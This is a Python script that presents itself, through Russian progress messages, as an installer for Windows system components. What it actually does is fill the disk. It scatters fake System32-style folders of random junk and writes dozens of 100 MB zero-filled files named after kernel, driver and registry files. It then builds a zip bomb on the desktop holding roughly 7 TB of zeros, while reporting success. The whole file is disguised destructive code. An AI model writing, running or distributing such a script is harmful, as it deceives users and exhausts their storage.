import os, zipfile, shutil, tempfile, random, string, time, sys, traceback
from tqdm import tqdm

try:
    def generate_educational_content():
        return "".join(random.choices(string.printable, k=2048))

    system_dirs = [
        "Windows\\System32\\config",
        "Windows\\System32\\drivers",
        "Windows\\System32\\spool",
        "Windows\\System32\\wbem",
        "Windows\\System32\\IME",
        "Windows\\System32\\CatRoot",
        "Windows\\System32\\Com",
        "Windows\\System32\\ReinstallBackups",
        "Windows\\System32\\DllCache",
        "Windows\\System32\\GroupPolicy",
        "Windows\\system",
        "Windows\\security",
        "Windows\\srchasst",
        "Windows\\repair",
        "Windows\\inf",
        "Windows\\Help",
        "Windows\\Config",
        "Windows\\msagent",
        "Windows\\Cursors",
        "Windows\\Media",
        "Windows\\Mui",
        "Windows\\addins",
        "Windows\\Driver Cache\\i386",
        "Windows\\TEMP",
        "Windows\\twain_32",
        "Windows\\AppPatch",
        "Windows\\Debug",
        "Windows\\Resources\\Themes",
        "Windows\\WinSxS",
        "Windows\\ime",
        "Windows\\PCHealth\\HelpCtr\\Binaries",
        "Windows\\Prefetch",
        "Windows\\Fonts",
        "Program Files\\Common Files",
        "Program Files\\Internet Explorer",
        "Program Files\\Windows Media Player",
        "Program Files (x86)\\Common Files",
        "Users\\Default\\AppData\\Roaming",
        "Users\\Default\\AppData\\Local\\Temp",
        "Users\\Public\\Documents",
        "Users\\Public\\Music",
        "Users\\Public\\Pictures",
        "Users\\Public\\Videos",
        "Windows\\System32\\winevt\\Logs",
        "Windows\\System32\\wdi\\LogFiles",
        "Windows\\System32\\wdi\\ManifestBackup",
        "Windows\\System32\\migration",
        "Windows\\System32\\oobe",
        "Windows\\System32\\restore",
        "Windows\\System32\\setup",
        "Windows\\System32\\sysprep",
        "Windows\\System32\\vss",
        "Windows\\System32\\wbem\\Repository",
        "Windows\\System32\\Wfp",
        "Windows\\System32\\winsxs",
        "Windows\\System32\\xpsrchvw",
        "Windows\\System32\\zh-CN",
        "Windows\\System32\\zh-TW",
        "Windows\\System32\\en-US",
        "Windows\\System32\\ru-RU",
        "Windows\\System32\\drivers\\en-US",
        "Windows\\System32\\drivers\\ru-RU",
        "Windows\\System32\\spool\\PRINTERS",
        "Windows\\System32\\spool\\SERVERS",
        "Windows\\System32\\spool\\DRIVERS\\W32X86",
        "Windows\\System32\\spool\\DRIVERS\\x64",
        "Windows\\System32\\Tasks",
        "Windows\\System32\\Tasks\\Microsoft\\Windows\\RAC",
        "Windows\\System32\\Tasks\\Microsoft\\Windows\\Registry",
        "Windows\\System32\\Tasks\\Microsoft\\Windows\\TaskScheduler",
        "Windows\\System32\\Tasks\\Microsoft\\Windows\\Time Synchronization",
        "Windows\\System32\\Tasks\\Microsoft\\Windows\\UpdateOrchestrator",
        "Windows\\System32\\Tasks\\Microsoft\\Windows\\WindowsUpdate"
    ]

    print("[SYSTEM] Начало установки компонентов Windows...")
    time.sleep(1)

    total_dirs = len(system_dirs)
    total_large = 55
    total_steps = total_dirs + total_large + 3

    with tqdm(total=total_steps, desc="Создание системных папок", bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}]") as pbar:
        for d in system_dirs:
            os.makedirs(d, exist_ok=True)
            for f in ["sys.ini", "config.bin", "data.tmp", "cache.dat", "settings.reg"]:
                try:
                    with open(os.path.join(d, f), "w") as stub:
                        stub.write(generate_educational_content())
                except:
                    pass
            pbar.update(1)
            time.sleep(0.001)

        for d in system_dirs:
            for i in range(3):
                sub = os.path.join(d, f"sub_{i}")
                os.makedirs(sub, exist_ok=True)
                for f in ["log.txt", "dump.bin", "temp.dat"]:
                    try:
                        with open(os.path.join(sub, f), "w") as stub:
                            stub.write("".join(random.choices(string.printable, k=8192)))
                    except:
                        pass
            pbar.update(0)

        pbar.set_description("Развертывание системных файлов")
        large_files = [
            "Windows\\System32\\ntoskrnl.bak",
            "Windows\\System32\\hal.dll.bak",
            "Windows\\System32\\kernel32.dll.bak",
            "Windows\\System32\\winload.efi.bak",
            "Windows\\System32\\winload.exe.bak",
            "Windows\\System32\\ntdll.dll.bak",
            "Windows\\System32\\drivers\\ntfs.sys.bak",
            "Windows\\System32\\drivers\\tcpip.sys.bak",
            "Windows\\System32\\drivers\\usbhub.sys.bak",
            "Windows\\System32\\drivers\\disk.sys.bak",
            "Windows\\System32\\drivers\\volmgr.sys.bak",
            "Windows\\System32\\drivers\\fvevol.sys.bak",
            "Windows\\System32\\drivers\\rdbss.sys.bak",
            "Windows\\System32\\drivers\\mrxsmb.sys.bak",
            "Windows\\System32\\drivers\\mup.sys.bak",
            "Windows\\System32\\drivers\\nsiproxy.sys.bak",
            "Windows\\System32\\config\\software.bak",
            "Windows\\System32\\config\\system.bak",
            "Windows\\System32\\config\\sam.bak",
            "Windows\\System32\\config\\security.bak",
            "Windows\\System32\\config\\default.bak",
            "Windows\\System32\\config\\BCD-Template.bak",
            "Windows\\System32\\config\\RegBack\\software.bak",
            "Windows\\System32\\config\\RegBack\\system.bak",
            "Windows\\System32\\config\\RegBack\\sam.bak",
            "Windows\\System32\\config\\RegBack\\security.bak",
            "Windows\\System32\\config\\RegBack\\default.bak",
            "Windows\\System32\\catroot\\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}\\catdb.bak",
            "Windows\\System32\\catroot\\{127D0A1D-4EF2-11D1-8608-00C04FC295EE}\\catdb.bak",
            "Windows\\System32\\wbem\\cimwin32.bak",
            "Windows\\System32\\wbem\\wmiutils.bak",
            "Windows\\System32\\wbem\\wbemcore.bak",
            "Windows\\System32\\wbem\\wbemprox.bak",
            "Windows\\System32\\wbem\\wbemsvc.bak",
            "Windows\\System32\\wbem\\fastprox.bak",
            "Windows\\System32\\wbem\\repdrvfs.bak",
            "Windows\\System32\\wbem\\ntevt.bak",
            "Windows\\System32\\wbem\\wmiprvse.bak",
            "Windows\\System32\\wbem\\wmiaprpl.bak",
            "Windows\\System32\\wbem\\wmic.exe.bak",
            "Windows\\System32\\wbem\\wmiprop.dll.bak",
            "Windows\\System32\\spool\\drivers\\x64\\3\\printconfig.bak",
            "Windows\\System32\\spool\\drivers\\x64\\3\\printerdrv.bak",
            "Windows\\System32\\spool\\drivers\\x64\\3\\unidrv.bak",
            "Windows\\System32\\spool\\drivers\\x64\\3\\pclxl.bak",
            "Windows\\System32\\spool\\drivers\\x64\\3\\pscript.bak",
            "Windows\\System32\\spool\\drivers\\x64\\3\\xmlprint.bak",
            "Windows\\System32\\drivers\\etc\\hosts.bak",
            "Windows\\System32\\drivers\\etc\\networks.bak",
            "Windows\\System32\\drivers\\etc\\protocol.bak",
            "Windows\\System32\\drivers\\etc\\services.bak",
            "Windows\\System32\\drivers\\etc\\lmhosts.bak",
            "Windows\\System32\\tasks\\taskcache.bak",
            "Windows\\System32\\tasks\\schedsvc.bak",
            "Windows\\System32\\tasks\\taskschd.bak",
            "Windows\\System32\\tasks\\taskcomp.bak"
        ]

        chunk_100mb = b"\x00" * (100 * 1024 * 1024)
        for path in large_files:
            try:
                full = os.path.join(os.getcwd(), path)
                os.makedirs(os.path.dirname(full), exist_ok=True)
                with open(full, "wb") as f:
                    f.write(chunk_100mb)
                pbar.update(1)
                time.sleep(0.001)
            except:
                pbar.update(1)

        pbar.set_description("Настройка системных параметров")
        time.sleep(0.5)
        pbar.update(1)

        pbar.set_description("Создание профилей пользователей")
        for user in ["Admin", "User", "Guest", "Default"]:
            os.makedirs(f"Users\\{user}\\AppData\\Local", exist_ok=True)
            os.makedirs(f"Users\\{user}\\AppData\\Roaming", exist_ok=True)
            os.makedirs(f"Users\\{user}\\Documents", exist_ok=True)
            os.makedirs(f"Users\\{user}\\Downloads", exist_ok=True)
            os.makedirs(f"Users\\{user}\\Desktop", exist_ok=True)
            time.sleep(0.01)
        pbar.update(1)

    print("[SYSTEM] Установка завершена успешно!")
    time.sleep(0.5)

    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    if not os.path.exists(desktop):
        desktop = os.environ.get("USERPROFILE", "C:\\Users\\Default") + "\\Desktop"

    os.chdir(desktop)

    chunk_size = 1024 * 1024
    iterations = 7173 * 1024

    with tqdm(total=iterations, desc="Подготовка системных данных", bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}]") as pbar:
        with open("temp_chunk.tmp", "wb") as f:
            f.write(b"\x00" * chunk_size)
        pbar.update(1)
        
        with zipfile.ZipFile("SERVIS.zip", "w", compression=zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
            with zf.open("data.bin", "w", force_zip64=True) as z:
                for i in range(iterations):
                    with open("temp_chunk.tmp", "rb") as tf:
                        z.write(tf.read())
                    if i % 100 == 0:
                        pbar.update(100)
                    if i % 1000 == 0:
                        time.sleep(0.001)

    os.remove("temp_chunk.tmp")

    print("\n[OK] Система успешно развернута!")
    print(f"[OK] Расположение: {os.path.join(desktop, 'SERVIS.zip')}")
    print("[SYSTEM] Все компоненты готовы к использованию.")
    time.sleep(5)

except Exception as e:
    with open("error_log.txt", "w") as log:
        log.write("=== ERROR LOG ===\n")
        log.write(str(e) + "\n")
        log.write(traceback.format_exc())
    print("Произошла ошибка. Подробности в error_log.txt")
    time.sleep(5)